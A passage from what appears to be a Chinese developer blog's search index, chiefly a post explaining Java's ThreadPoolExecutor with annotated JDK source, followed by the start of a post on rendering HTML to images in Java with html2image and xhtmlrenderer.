pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 3. 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 4. 扫描关注","link":"/hexblog/2018/05/12/Spring学习之事务的使用姿势/"},{"title":"Java并发学习之线程池ThreadPoolExecutor的小结","text":"Java并发学习之线程池ThreadPoolExecutor的小结本篇博文将带着问题来回顾小结多线程池相关的知识点 线程池的几种创建方式 线程池的优点是什么 应用场景 如何使用 实现原理 异常状况怎么处理 线程池中任务的提交执行后，到线程执行，执行完成的整个流程逻辑 线程池中的线程回收机制 I. 什么是线程池1. 通俗讲解我们先举一个小例子来说一下什么是线程池，以及线程池的工作方式 首先在看一下线程池中提交一个任务的流程图 下面就是实际的case：基本上大家都去过银行，我们就以到银行的柜台上办理业务的流程来说明线程池，我们先假设这里有一个xx银行（这里是广告位，待租😉），总共有8个柜台，平时只开放4个柜台，大厅内总共有20个座位。 那么来一个办理业务的，如果开放的四个柜台上，有空的，直接上去办理业务即可 如果四个柜台都在处理业务了，那么办理业务则需要取一个号，到大厅的座位上等着叫号 如果大厅坐满了，银行经理决定开放所有的柜台，那么新来办理的人直接到新的柜台上处理 如果所有柜台都在处理，且大厅也满了，这个时候就告诉新来办理业务的现在已经满载了，你们到xxx地的银行去办理吧（或者回家等下午再来好了） 从流程上的对比来看，就很相似了，虽然实际上银行可不会因为人的太多来新增开放柜台的数量，下面简单的将上面的case映射到线程池的成员上 4个开放柜台 ： 对应线程池的corePoolSize(核心工作线程数) 8个总柜台：对应线程池的maximumPoolSize(最大工作线程数) 20个座位：对应线程池的workQueue(任务队列) 所以线程池中提交一个任务时，优先看核心工作线程数是否已满，未满时，直接创建线程执行；已满，则丢入队列；如果队列也满了，则判断工作线程数是否超过最大数，没有则直接创建线程执行；否则直接“丢弃”这个任务了 （注意这个丢弃不是真的丢弃，其处理策略可以由你自己定义） 上面是基本流程，并没有涉及到工作线程的回收，线程池的状态（比如银行是否打烊了），任务的执行策略等 2. 线程池说明线程池是一种多线程的处理机制，主要是为了减少线程的频繁创建和销毁，从而提升系统效率 使用线程池优点 减少了创建和销毁线程的次数，每个工作线程都可以被重复利用，可执行多个任务 可以根据系统的承受能力，调整线程池中工作线线程的数量 使用线程池场景 我们将线程进行拆分，创建线程耗时T1, 线程执行耗时T2, 销毁线程耗时T3 如果你的场景中，提交线程执行的任务非常频繁，且具体的执行耗时较短，即 T1 + T3 &gt; T2, 这种场景下使用线程池可以带来明显的性能提升 一般来说，如果不是你的任务只偶尔的运行几次，那么绝大部分场景都适合用线程池来处理 3. 线程池组成类定义： java.util.concurrent.ThreadPoolExecutor 构造 1234567891011121314151617181920212223// 线程池构造方法public ThreadPoolExecutor(int corePoolSize, // 核心线程数 int maximumPoolSize, // 最大线程数 long keepAliveTime, // 存活时间 TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, // 排队队列 ThreadFactory threadFactory, // 创建线程的工作类 RejectedExecutionHandler handler) // 线程数满，队列满时具体任务策略{ if (corePoolSize &lt; 0 || maximumPoolSize &lt;= 0 || maximumPoolSize &lt; corePoolSize || keepAliveTime &lt; 0) throw new IllegalArgumentException(); if (workQueue == null || threadFactory == null || handler == null) throw new NullPointerException(); this.corePoolSize = corePoolSize; this.maximumPoolSize = maximumPoolSize; this.workQueue = workQueue; this.keepAliveTime = unit.toNanos(keepAliveTime); this.threadFactory = threadFactory; this.handler = handler;} II. 线程池使用1. 构造参数详解构造参数较多，创建一个线程池，当然首先得搞清楚这些参数是干嘛用的 参数 含义 说明 corePoolSize 核心工作线程数 没有任务时，线程池中允许存在的最小空闲线程数 工作线程数 &lt; corePoolSize时，提交任务创建工作线程来执行任务 maximumPoolSize 最大工作线程数 线程池中允许出现的最大工作线程数量 当队列满 &amp;&amp; 工作线程数 &lt; maximumPoolSize时，新的队列将创建线程来执行； 如果队列没有边界，那么这个参数没有意义 workQueue 任务队列 保存待执行任务的阻塞队列； 当 (工作线程数 &gt;= corePoolSize) &amp;&amp; (任务数 &lt; 任务队列长度)时，任务会offer()入队等待 keepAliveTime 工作线程最大空闲时间 当线程数 &gt; corePoolSize时，这个参数表示空闲线程存活时间； 超时的空闲线程，会被回收掉，直到线程数==corePoolSzie; 当allowCoreThreadTimeOut=true时，则超时的核心工作线程也会被回收 unit 时间单位 keepAliveTime的时间单位 threadFactory 线程创建工厂 创建线程的工厂类，可以在这里指定创建线程的name，设置守护线程，异常case处理等 handler 饱和策略执行器 线程池和队列都已满时，新提交任务的处理策略 默认是Abort(直抛Reject异常)，包括Discard(LIFO规则丢弃)、DiscardOldest(LRU规则丢弃) 以及 CallerRuns(调用者线程执行)，允许自定义执行器 2. 线程池的创建直接调用构造方法创建最直观的方式，直接构造方法new一个 1234567891011121314151617181920212223242526272829303132333435// 报警线程池ExecutorService executorService = new ThreadPoolExecutor(3, 5, 60, TimeUnit.SECONDS, new LinkedBlockingDeque&lt;Runnable&gt;(10), new DefaultThreadFactory(\"test-thread\"), new ThreadPoolExecutor.CallerRunsPolicy()); // 线程创建工厂，主要设置为非守护线程，指定线程名，设置优先级// 关于这个工厂类，推荐看netty的实现public class DefaultThreadFactory implements ThreadFactory { private static final AtomicInteger poolNumber = new AtomicInteger(1); private final ThreadGroup group; private final AtomicInteger threadNumber = new AtomicInteger(1); private final String namePrefix; public DefaultThreadFactory(String poolName) { if (null == poolName) { poolName = \"pool\"; } SecurityManager s = System.getSecurityManager(); group = (s != null) ? s.getThreadGroup() : Thread.currentThread().getThreadGroup(); namePrefix = poolName + poolNumber.getAndIncrement() + \"-thread-\"; } @Override public Thread newThread(Runnable r) { Thread t = new Thread(group, r, namePrefix + threadNumber.getAndIncrement(), 0); if (t.isDaemon()) t.setDaemon(false); if (t.getPriority() != Thread.NORM_PRIORITY) t.setPriority(Thread.NORM_PRIORITY); return t; }} 利用 Executors创建jdk1.5+ 中提供了 java.util.concurrent.Executors 来创建常见的集中线程池方式 关于各种线程池的说明可以参考: Java并发学习之玩转线程池 固定大小线程池 123456// 创建一个固定大小的线程池public static ExecutorService newFixedThreadPool(int nThreads) { return new ThreadPoolExecutor(nThreads, nThreads, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue&lt;Runnable&gt;());} 工作窃取线程池 123456public static ExecutorService newWorkStealingPool(int parallelism) { return new ForkJoinPool (parallelism, ForkJoinPool.defaultForkJoinWorkerThreadFactory, null, true);} 创建单线程池 123456public static ExecutorService newSingleThreadExecutor() { return new FinalizableDelegatedExecutorService (new ThreadPoolExecutor(1, 1, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue&lt;Runnable&gt;()));} 缓存线程池 12345public static ExecutorService newCachedThreadPool() { return new ThreadPoolExecutor(0, Integer.MAX_VALUE, 60L, TimeUnit.SECONDS, new SynchronousQueue&lt;Runnable&gt;());} 定时任务线程池 123public static ScheduledExecutorService newScheduledThreadPool(int corePoolSize) { return new ScheduledThreadPoolExecutor(corePoolSize);} 不可配置线程池 12345public static ExecutorService unconfigurableExecutorService(ExecutorService executor) { if (executor == null) throw new NullPointerException(); return new DelegatedExecutorService(executor);} 3. 提交任务execute: 提交无须返回值的任务 submit(Runnable): 适用于提交需要返回值的任务 相比较于上面的，区别是这个会返回一个 Future 对象，通过调用future.get()可以获取线程的返回值， 其中这个方程是线程阻塞的，直到返回了结果之后，才会继续执行下去 4. 关闭线程池shutdown(): 有序地关闭线程池，已提交的任务会被执行(包含正在执行和任务队列中的)，但会拒绝新任务 shutdownNow(): 立即(尝试)停止执行所有任务(包含正在执行和任务队列中的)，并返回待执行任务列表 III. 线程池实现原理1. 线程池状态线程池状态流程如下： RUNNING -&gt; SHUTDOWN -&gt; STOP -&gt; TIDYING -&gt; TERMINATED 每个状态含义 1234567891011121314//高3位111，低29位为0 该状态下线程池会接收新提交任务和执行队列任务private static final int RUNNING = -1 &lt;&lt; COUNT_BITS;//高3位000，低29位为0 该状态下线程池不再接收新任务，但还会继续执行队列任务private static final int SHUTDOWN = 0 &lt;&lt; COUNT_BITS;//高3位001，低29位为0 该状态下线程池不再接收新任务，不会再执行队列任务，并会中断正在执行中的任务private static final int STOP = 1 &lt;&lt; COUNT_BITS;//高3位010，低29位为0 该状态下线程池的所有任务都被终止，工作线程数为0，期间会调用钩子方法terminated()private static final int TIDYING = 2 &lt;&lt; COUNT_BITS;//高3位011，低29位为0 该状态下表明线程池terminated()方法已经调用完成private static final int TERMINATED = 3 &lt;&lt; COUNT_BITS; 2. 任务提交逻辑最开始的流图就说明了任务提交后的流程，针对流程块也就不继续细说，只提一个注意点 若实际工作线程数workers&lt;核心工作线程数corePoolSize，则创建新工作线程来执行新任务execute(Runable) 若实际工作线程数workers&gt;=核心工作线程数corePoolSize(核心工作线程们都在执行任务)且任务队列workQueue未满，则将任务加入到任务队列workQueue中 若任务队列workQueue已满，则创建新工作线程来执行任务execute() 若实际工作线程数workers&gt;=最大工作线程数maximumPoolSize(所有线程都在执行任务)，此时任务数已饱和，需要根据饱和拒绝策略rejectedExecutionHandler执行相对应的饱和拒绝操作 线程池的总体设计是基于性能考虑，尽可能避免获取全局锁： 由于创建新线程时都需要获取全局锁，因此步骤1和步骤3必须加锁 为了避免多次获取全局锁(性能伸缩瓶颈)，当实际工作线程数&gt;=核心工作线程数时，之后会执行步骤2(入队时无须获取全局锁) 线程池内线程回收策略 若实际工作线程数workers&gt;核心工作线程数corePoolSize，回收空闲时间超过keepAliveTime的空闲的非核心线程(减少工作线程数直到&lt;=核心工作线程数即可) 若设置allowCoreThreadTimeOut为true时，则超过keepAliveTime的空闲的核心工作线程也会被回收 3. 任务执行说明，下面两段代码解析来自转载： 并发番@ThreadPoolExecutor execute() - 提交任务123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899/** * 1.若实际工作线程数 &lt; 核心工作线程数，会尝试创建一个工作线程去执行该 * 任务，即该command会作为该线程的第一个任务，即第一个firstTask * * 2.若任务入队成功，仍需要执行双重校验，原因有两点： * - 第一个是去确认是否需要新建一个工作线程，因为可能存在 * 在上次检查后已经死亡died的工作线程 * - 第二个是可能在进入该方法后线程池被关闭了， * 比如执行shutdown() * 因此需要再次检查state状态，并分别处理以上两种情况： * - 若线程池中已无可用工作线程了，则需要新建一个工作线程 * - 若线程池已被关闭，则需要回滚入队列(若有必要) * * 3.若任务入队失败(比如队列已满)，则需要新建一个工作线程； * - 若新建线程失败，说明线程池已停止或者已饱和，必须执行拒绝策略 */public void execute(Runnable command) { //新任务不允许为空，空则抛出NPE if (command == null) throw new NullPointerException(); // ctl 为线程池状态控制器，用于保证线程池状态和工作线程数 // 低29位为工作线程数量，高3位为线程池状态 int c = ctl.get(); /** * case1：当实际工作线程数 &lt; 核心工作线程数时 * 执行方案：会创建一个新的工作线程去执行该任务 * 注意：此时即使有其他空闲的工作线程也还是会新增工作线程， * 直到达到核心工作线程数为止 */ if (workerCountOf(c) &lt; corePoolSize) { /** * 新增工作线程，true表示要对比的是核心工作线程数 * 一旦新增成功就开始执行当前任务 * 期间也会通过自旋获取队列任务进行执行 */ if (addWorker(command, true)) return; /** * 需要重新获取控制器状态，说明新增线程失败 * 线程失败的原因可能有两种： * - 1.线程池已被关闭，非RUNNING状态的线程池是不允许接收新任务的 * - 2.并发时，假如都通过了workerCountOf(c) &lt; corePoolSize校验，但其他线程 * 可能会在addWorker前先创建出线程，导致workerCountOf(c) &gt;= corePoolSize， * 即实际工作线程数 &gt;= 核心工作线程数，此时需要进入case2 */ c = ctl.get(); } /** * case2：当实际工作线程数&gt;=核心线程数时，新提交任务需要入队 * 执行方案：一旦入队成功，仍需要处理线程池状态突变和工作线程死亡的情况 */ if (isRunning(c) &amp;&amp; workQueue.offer(command)) { //双重校验 int recheck = ctl.get(); /** * recheck的目的是为了防止线程池状态的突变 - 即被关闭 * 一旦线程池非RUNNING状态时，除了从队列中移除该任务(回滚)外 * 还需要执行任务拒绝策略处理新提交的任务 */ if (!isRunning(recheck) &amp;&amp; remove(command)) //执行任务拒绝策略 reject(command); /** * 若线程池还是RUNNING状态 或 * 队列移除失败(可能正好被一个工作线程拿到处理了) * 此时需要确保至少有一个工作线程还可以干活 * 补充一句：之所有无须与核心工作线程数或最大线程数相比，而只是比较0的原因是 * 只要保证有一个工作线程可以干活就行，它会自动去获取任务 */ else if (workerCountOf(recheck) == 0) /** * 若工作线程都已死亡，需要新增一个工作线程去干活 * 死亡原因可能是线程超时或者异常等等复杂情况 * * 第一个参数为null指的是传入一个空任务， * 目的是创建一个新工作线程去处理队列中的剩余任务 * 第二个参数为false目的是提示可以扩容到最大工作线程数 */ addWorker(null, false); } /** * case3：一旦线程池被关闭 或者 新任务入队失败(队列已满) * 执行方案：会尝试创建一个新的工作线程，并允许扩容到最大工作线程数 * 注意：一旦创建失败，比如超过最大工作线程数，需要执行任务拒绝策略 */ else if (!addWorker(command, false)) //执行任务拒绝策略 reject(command);} 上面的代码虽然非常少，但是逻辑还是比较多的，创建线程是根据 addWorker方法来实现的，其主要逻辑为 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204/** * 新增工作线程需要遵守线程池控制状态规定和边界限制 * * @param core core为true时允许扩容到核心工作线程数，否则为最大工作线程数 * @return 新增成功返回true，失败返回false */private boolean addWorker(Runnable firstTask, boolean core) { //重试标签 retry: /*** * 外部自旋 -&gt; 目的是确认是否能够新增工作线程 * 允许新增线程的条件有两个： * 1.满足线程池状态条件 -&gt; 条件一 * 2.实际工作线程满足数量边界条件 -&gt; 条件二 * 不满足条件时会直接返回false，表示新增工作线程失败 */ for (;;) { //读取原子控制量 - 包含workerCount(实际工作线程数)和runState(线程池状态) int c = ctl.get(); //读取线程池状态 int rs = runStateOf(c); /** * 条件一.判断是否满足线程池状态条件 * 1.只有两种情况允许新增线程： * 1.1 线程池状态==RUNNING * 1.2 线程池状态==SHUTDOWN且firstTask为null同时队列非空 * * 2.线程池状态&gt;=SHUTDOWN时不允许接收新任务，具体如下： * 2.1 线程池状态&gt;SHUTDOWN，即为STOP、TIDYING、TERMINATED * 2.2 线程池状态==SHUTDOWN，但firstTask非空 * 2.3 线程池状态==SHUTDOWN且firstTask为空，但队列为空 * 补充：针对1.2、2.2、2.3的情况具体请参加后面的\"小问答\"环节 */ if (rs &gt;= SHUTDOWN &amp;&amp; !(rs == SHUTDOWN &amp;&amp; firstTask == null &amp;&amp; ! workQueue.isEmpty())) return false; /*** * 内部自旋 -&gt; 条件二.判断实际工作线程数是否满足数量边界条件 * -数量边界条件满足会对尝试workerCount实现CAS自增，否则新增失败 * -当CAS失败时会再次重新判断是否满足新增条件： * 1.若此期间线程池状态突变(被关闭)，重新判断线程池状态条件和数量边界条件 * 2.若此期间线程池状态一致，则只需重新判断数量边界条件 */ for (;;) { //读取实际工作线程数 int wc = workerCountOf(c); /** * 新增工作线程会因两种实际工作线程数超标情况而失败： * 1.实际工作线程数 &gt;= 最大容量 * 2.实际工作线程数 &gt; 工作线程比较边界数(当前最大扩容数) * -若core = true，比较边界数 = 核心工作线程数 * -若core = false，比较边界数 = 最大工作线程数 */ if (wc &gt;= CAPACITY || wc &gt;= (core ? corePoolSize : maximumPoolSize)) return false; /** * 实际工作线程计数CAS自增: * 1.一旦成功直接退出整个retry循环，表明新增条件都满足 * 2.因并发竞争导致CAS更新失败的原因有三种: * 2.1 线程池刚好已新增一个工作线程 * -&gt; 计数增加，只需重新判断数量边界条件 * 2.2 刚好其他工作线程运行期发生错误或因超时被回收 * -&gt; 计数减少，只需重新判断数量边界条件 * 2.3 刚好线程池被关闭 * -&gt; 计数减少，工作线程被回收， * 需重新判断线程池状态条件和数量边界条件 */ if (compareAndIncrementWorkerCount(c)) break retry; //重新读取原子控制量 -&gt; 原因是在此期间可能线程池被关闭了 c = ctl.get(); /** * 快速检测是否发生线程池状态突变 * 1.若状态突变，重新判断线程池状态条件和数量边界条件 * 2.若状态一致，则只需重新判断数量边界条件 */ if (runStateOf(c) != rs) continue retry; } } /** * 这里是addWorker方法的一个分割线 * 前面的代码的作用是决定了线程池接受还是拒绝新增工作线程 * 后面的代码的作用是真正开始新增工作线程并封装成Worker接着执行后续操作 * PS:虽然笔者觉得这个方法其实可以拆分成两个方法的(在break retry的位置) */ //记录新增的工作线程是否开始工作 boolean workerStarted = false; //记录新增的worker是否成功添加到workers集合中 boolean workerAdded = false; Worker w = null; try { //将新提交的任务和当前线程封装成一个Worker w = new Worker(firstTask); //获取新创建的实际工作线程 final Thread t = w.thread; /** * 检测是否有可执行任务的线程，即是否成功创建了新的工作线程 * 1.若存在，则选择执行任务 * 2.若不存在，则需要执行addWorkerFailed()方法 */ if (t != null) { /** * 新增工作线程需要加全局锁 * 目的是为了确保安全更新workers集合和largestPoolSize */ final ReentrantLock mainLock = this.mainLock; mainLock.lock(); try { /** * 获得全局锁后，需再次检测当前线程池状态 * 原因在于预防两种非法情况： * 1.线程工厂创建线程失败 * 2.在锁被获取之前，线程池就被关闭了 */ int rs = runStateOf(ctl.get()); /** * 只有两种情况是允许添加work进入works集合的 * 也只有进入workers集合后才是真正的工作线程，并开始执行任务 * 1.线程池状态为RUNNING(即rs&lt;SHUTDOWN) * 2.线程池状态为SHUTDOWN且传入一个空任务 * (理由参见：小问答之快速检测线程池状态?) */ if (rs &lt; SHUTDOWN || (rs == SHUTDOWN &amp;&amp; firstTask == null)) { /** * 若线程处于活动状态时，说明线程已启动，需要立即抛出\"线程状态非法异常\" * 原因是线程是在后面才被start的，已被start的不允许再被添加到workers集合中 * 换句话说该方法新增线程时，而线程是新的，本身应该是初始状态(new) * 可能出现的场景：自定义线程工厂newThread有可能会提前启动线程 */ if (t.isAlive()) throw new IllegalThreadStateException(); //由于加锁，所以可以放心的加入集合 workers.add(w); int s = workers.size(); //更新最大工作线程数，由于持有锁，所以无需CAS if (s &gt; largestPoolSize) largestPoolSize = s; //确认新建的worker已被添加到workers集合中 workerAdded = true; } } finally { //千万不要忘记主动解锁 mainLock.unlock(); } /** * 一旦新建工作线程被加入工作线程集合中，就意味着其可以开始干活了 * 有心的您肯定发现在线程start之前已经释放锁了 * 原因在于一旦workerAdded为true时，说明锁的目的已经达到 * 根据最小化锁作用域的原则，线程执行任务无须加锁，这是种优化 * 也希望您在使用锁时尽量保证锁的作用域最小化 */ if (workerAdded) { /** * 启动线程，开始干活啦 * 若您看过笔者的\"并发番@Thread一文通\"肯定知道start()后， * 一旦线程初始化完成便会立即调用run()方法 */ t.start(); //确认该工作线程开始干活了 workerStarted = true; } } } finally { //若新建工作线程失败或新建工作线程后没有成功执行，需要做新增失败处理 if (!workerStarted) addWorkerFailed(w); } //返回结果表明新建的工作线程是否已启动执行 return workerStarted;} 小问：快速检测线程状态时，情况1.2、2.1、2.3的意义是什么？ 小答：在阐明这个问题之前，我们先明确两个知识点： 新增Worker的目的是处理任务，任务来源分初始任务和队列任务(即剩余的待处理任务) 线程池在非RUNNING状态下是不允许接收新任务的，换句话说您都要下班了，难道还想接新需求？ 针对2.1 - &gt; 线程池状态==SHUTDOWN，但firstTask！= null，不允许新增Worker当线程池状态为SHUTDOWN时，由于不允许接收新任务，因此一旦firstTask！= null需要直接拒绝 针对2.2 - &gt; 线程池状态==SHUTDOWN，且firstTask == null， 但队列为空， 不允许新增Worker当firstTask为null时，说明调用addWorker()目的不是为了处理新增任务那么其目的应该是为了处理剩余任务，即队列中的任务，而一旦队列为空，那也没必要新增Worker了 针对1.2 - &gt; 若线程池状态==SHUTDOWN，必须满足firstTask为null且队列非空，才允许新增Worker当线程池状态为SHUTDOWN时(调用shutdown())，此时不允许接收新任务，因此firstTask必须为null但需要处理剩余任务，因此队列必须非空，否则新增的工作线程就无任务可做，那就没意义了结论：传入一个空任务的目的是为了新增工作线程去处理任务队列中的剩余任务 3. Worker类详解worker包装了任务的调度，用于封装工作线程和任务并管理工作线程的中断状态等功能 由于工作线程和worker实例是一对一的关系，因为可以简单的理解工作线程等价于worker，尤其是谈及数量时，比如创建工作线程实际上就是创建一个worker 线程在线程池执行任务的工作流程： 工作线程开始执行前，需先对worker加锁，任务完成解锁 任务执行前后分别执行beforeExecute()和afterExecute()方法 执行中遇到异常会向外抛出，线程是否死亡取决于您对于异常的处理 每个任务执行完后，当前工作线程任务完成数自增，同时会循环调用getTask()从任务队列中反复获取任务并执行，无任务可执行时线程会阻塞在该方法上 当工作线程因各种理由退出时，会执行processWorkerExit()回收线程(核心是将该worker从workers集合中移除，注意之前worker已经退出任务循环，因此已经不再做工了，从集合移除后就方便gc了) 问：worker中断如何控制的 当工作线程真正开始执行之前，不允许被中断 当工作线程正在执行任务时，不允许被中断 当工作线程正等待从任务队列中获取任务getTask()时才能被中断 调用interruptIdleWorkers()中断空闲线程时必须先获得worker锁 问：为什么Worker不被设计成可重入锁？ 由于在动态控制方法中可能会中断线程，比如调用interruptIdleWorkers()，由此该方法在执行interrupt()之前会调用worker.tryLock()，若此时允许重入，就会导致线程被意外中断，这跟当工作线程正在执行任务时，不允许被中断准则是相违背的 IV. 问题解答1. 如何创建线程池直接根据构造方法创建 12345java.util.concurrent.ThreadPoolExecutor#ThreadPoolExecutor(int, int, long, java.util.concurrent.TimeUnit, java.util.concurrent.BlockingQueue&lt;java.lang.Runnable&gt;, java.util.concurrent.ThreadFactory, java.util.concurrent.RejectedExecutionHandler) 利用 Executors 创建线程池 12345678910111213java.util.concurrent.Executors#newFixedThreadPool(int)java.util.concurrent.Executors#newWorkStealingPool(int)java.util.concurrent.Executors#newSingleThreadExecutor()java.util.concurrent.Executors#newCachedThreadPool()java.util.concurrent.Executors#newSingleThreadScheduledExecutor()java.util.concurrent.Executors#newScheduledThreadPool(int)java.util.concurrent.Executors#unconfigurableExecutorService 2. 线程池的适用场景优点 减少了创建和销毁线程的次数，每个工作线程都可以被重复利用，可执行多个任务可以根据系统的承受能力，调整线程池中工作线线程的数量 使用线程池场景 我们将线程进行拆分，创建线程耗时T1, 线程执行耗时T2, 销毁线程耗时T3 如果你的场景中，提交线程执行的任务非常频繁，且具体的执行耗时较短，即 T1 + T3 &gt; T2, 这种场景下使用线程池可以带来明显的性能提升 一般来说，如果不是你的任务只偶尔的运行几次，那么绝大部分场景都适合用线程池来处理 3. 如何使用线程池创建线程池，提交任务 execute 适用于提交没有返回结果的任务 submit 适用于提交有返回结果的任务， 返回一个Futrure的包装类 4. 线程池实现原理 &amp; 任务提交后的流程在实现原理中会穿插上任务提交后的流程，所以就放在一起了 首先从提交一个任务开始： 首先判断工作线程数是否小于核心工作线程数，是则直接创建工作线程执行 否，则将任务丢入任务队列中 若任务队列已满，且工作线程数 &lt; 最大工作线程数，则直接创建工作线程执行任务 若队列满，且工作线程数达到最大值，则采用拒绝任务策略 其中上面的任务进队or创建线程执行，都需要关注线程池的状态，每个状态对应的原则 状态 说明 限制 RUNNING 运行状态 线程池会接收新提交任务和执行队列任务 SHUTDOWN 关闭状态 线程池不再接收新任务，但还会继续执行队列任务 STOP 停止状态 不再接收新任务，不会再执行队列任务，并会中断正在执行中的任务 TIDYING 整理状态 所有任务都被终止，工作线程数为0，期间会调用钩子方法terminated() TERMINATED 终止状态 线程池terminated()方法已经调用完成 接着上面，工作线程执行完毕之后，会尝试从任务队列中获取任务来执行，如果队列为空，则阻塞；此时工作线程空闲 根据工作线程的回收机制 允许回收核心工作线程时，将所有空闲时间大于keepAliveTime的线程回收掉 不允许回收核心工作线程，回收空闲时间大于keepAliveTime的线程，知道工作线程数量为核心工作线程数 5. 异常状况处理submit()异常处理 异常会保存在Future对象的ExecutionException中，可以在调用get()使用try-catch方式捕获，有N个任务有异常就会抛出来N个异常，但不会终止当前工作线程 单独设置UncaughtExceptionHandler没卵用，但结合(3)使用就有效 允许在submit()方法内部用try-catch捕获该异常，同样不会终止当前线程 若想在内部处理异常，还可以重写afterExecute()方法， execute()异常处理 默认会在execute()方法内部直接抛出异常，注意这不会中断线程池运行，但会终止当前工作线程，并重新创建新的工作线程执行该任务 允许在execute()方法内部用try-catch捕获该异常，好处是不会终止当前线程并重新创建一个新的线程了 重写afterExecute()方法 还可以设置UncaughtExceptionHandler 一个实例如下: 1234567891011ThreadPoolExecutor threadPoolExecutor = new ThreadPoolExecutor(1, 2, 3, TimeUnit.SECONDS, new LinkedBlockingQueue(), //我们自定义一个线程工厂和重写线程的setUncaughtExceptionHandler方法 new ThreadFactory() { final AtomicInteger threadNumber = new AtomicInteger(1); public Thread newThread(Runnable r) { Thread thread = new Thread(Thread.currentThread().getThreadGroup(), r, \"thread-\" + (threadNumber.getAndIncrement())); thread.setUncaughtExceptionHandler((t,e) -&gt; System.out.println(e)); return thread; }}); 6. 线程池关闭关闭线程池主要有两种方式，两者的区别是： shutdown() : 队列剩余任务全部执行完毕再终止 shutdownNow() : 放弃执行队列剩余任务，但会将它们返回 两者的共性在于： 正在执行中的任务会继续执行，不会被终止或放弃 新提交的任务会被直接拒绝 V. 其他参考 Java-线程池专题（什么是线程池，如何使用，为什么要用） 并发番@ThreadPoolExecutor 个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正，我的微博地址: 小灰灰Blog 扫描关注","link":"/hexblog/2018/03/06/Java并发学习之线程池ThreadPoolExecutor的小结/"},{"title":"图片合成支持的前世今生","text":"图片合成的前世今生 作为一个后端，为什么要做图片合成？为什么要实现类xml标记语言的渲染？ 本片博文准备详细的记录一下，一个java后端如何去支持图片合成，在这个过程中采用了哪些猥琐的方案，又遇到了哪些鬼畜的问题 I. 背景0. 无聊的技术研究最开始萌发支持图片合成的想法，那时候还是在做二维码的时候，用了一些awt的画图工具，感觉还挺有意思的，这是一个和当前的电商主流完全不搭边的技术分支，开始用的时候感慨，这东西牛逼了，什么都可以干（虽然操作非常不友好），再加上用到有道云，它的会员功能支持加功能将笔记以图片方式生成，所以就有个想法，java后端能不能支持markdown输出图片呢？ 1. 蛋疼的小程序不是一个专业的小程序开发者，虽然写过一个小程序，但是很多特性依然不知道； 突然很多前端突然提了这么一个需求，要求后端支持图片合成，用于分享到朋友圈 至于原因: 有的说小程序没有提供截屏接口 小程序不支持绘图（这个我不太确定真实性） 小程序绘图的api不可控（如果他们有bug，我们就没法玩了；对此我的看法是，你整个东西都是在小程序的体系里了，要是有个严重bug，那我们的小程序干脆就不玩好了…） 前端这么多，每个人都去绘制一遍低效，有个后端通用的，各个平台都释放了，都可以直接用… (对此我也没啥好说的，如果我是前端我也挺这一点；然而我不是，所以我拒绝😢) 声明 上面括号的内容纯粹是个人吐槽，没有任何偏向性， 2. 开动有需求了，就必须去支持了，而且从技术角度出发，这是一个非常有意思的点，新的挑战，可以一试 II. 技术尝试为了支持这个需求，尝试了不少的手段，接下来一一说明，当然由于个人见识有限，最终选择的也不一定是啥好东西，目前也只是处于可用的状态，离友好支持，还比较遥远 0. java的html渲染库 最先想到的就是这个，有没有直接可以渲染的库，大Java号称是在github上拥有最多开源工具的语言 查了一些开源库，也主动去尝试过一些，下面给出使用姿势 a. html2image直接在Github上搜，找一个最多star的就可以了，测试的框架 java-html2image 接入及测试方式 pmo 依赖引入 12345678910111213&lt;dependency&gt; &lt;groupId&gt;gui.ava&lt;/groupId&gt; &lt;artifactId&gt;html2image&lt;/artifactId&gt; &lt;version&gt;0.9&lt;/version&gt;&lt;/dependency&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;yoava&lt;/id&gt; &lt;name&gt;AOL yoava&lt;/name&gt; &lt;url&gt;http://yoava.artifactoryonline.com/yoava/repo&lt;/url&gt; &lt;/repository&gt;&lt;/repositories&gt; 测试代码也比较简单 123456789@Testpublic void testRenderHtml() { String url = \"http://www.baidu.com\"; HtmlImageGenerator generator = new HtmlImageGenerator(); generator.loadUrl(url); BufferedImage img = generator.getBufferedImage(); System.out.println(\"---\");} 接下来就是看输出的图片了，看下是否和我们预期相同 这个颜色，样式有点鬼畜，折腾了一番，实际验证这个框架挺不错的，就是有以下几个问题 很久很久很久很久很久以前的产物了 没人维护 css样式支持不友好 换个复杂点的url，比如淘宝or蘑菇街商品详情页，返回就更鬼畜了，有兴趣的童鞋可自己尝试一下 b. xhtml渲染包这个也可以实现html渲染，又是一个老古董级别的东西，已经忘记从哪里捞出来的，最初实现markdown渲染成图片，就是采用的这个包，对简单的css的支持还算友好 pom依赖 12345678910111213&lt;!--html to image render--&gt;&lt;dependency&gt; &lt;groupId&gt;org.xhtmlrenderer&lt;/groupId&gt; &lt;artifactId&gt;core-renderer&lt;/artifactId&gt; &lt;version&gt;R8&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;net.sourceforge.nekohtml&lt;/groupId&gt; &lt;artifactId&gt;nekohtml&lt;/artifactId&gt; &lt;version&gt;1.9.14&lt;/version&gt;&lt;/dependency&gt;&lt;!--html to image render--&gt; 测试case 12345678910@Testpublic void testRender() { try { String url = \"http://www.baidu.com\"; BufferedImage buf = ImageRenderer.renderToImage(url, \"/Users/yihui/html2image.pdf\", 800); System.out.println(\"---\"); } catch (Exception e) { e.printStackTrace(); }} 使用起来还是比较简单的，但是，上面这种直接执行，会抛异常，说访问的html有些语法有问题; 然后做了一些修改和调整，修正后的测试代码 